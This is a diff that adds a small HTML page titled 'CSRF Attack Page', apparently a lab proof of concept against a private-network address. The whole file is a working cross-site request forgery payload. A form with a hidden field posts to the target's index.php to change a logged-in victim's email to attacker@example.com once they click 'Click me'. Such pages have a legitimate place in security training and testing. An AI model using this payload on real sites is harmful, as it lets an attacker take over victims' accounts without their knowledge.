@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Page</title>
+</head>
+<body>
+    <h1>CSRF Attack Page</h1>
+    <form action="http://192.168.214.128/index.php" method="POST">
+        <input type="hidden" name="email" value="attacker@example.com">
+        <input type="submit" value="Click me">
+    </form>
+</body>
+</html>
